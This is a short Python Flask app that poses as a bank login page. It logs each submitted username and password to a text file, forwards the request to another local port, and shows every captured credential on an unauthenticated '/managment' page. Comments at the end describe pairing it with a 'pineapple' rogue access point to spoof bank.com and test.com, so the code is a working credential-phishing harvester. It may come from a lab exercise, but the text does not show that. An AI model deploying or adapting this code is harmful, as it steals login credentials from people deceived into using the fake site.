
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route("/", methods=['POST', 'GET'])
def fakeBank():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        with open('usernamePass.txt', 'a') as f:   
            f.write(f"\nusername = {username}, password = {password}")
        
        return redirect("http://localhost:2222", 307)

    return render_template('index.html')

@app.route("/managment")
def managment():
    with open('usernamePass.txt', 'r') as f:
        toprint = f.read()
    return f"<p>{toprint}<p>"

if __name__ == '__main__':
	app.run(debug = True, host="0.0.0.0")

# change the ip to use in the pineapple to the one we get from the output
# use it for bank.com and test.com
# use port 5000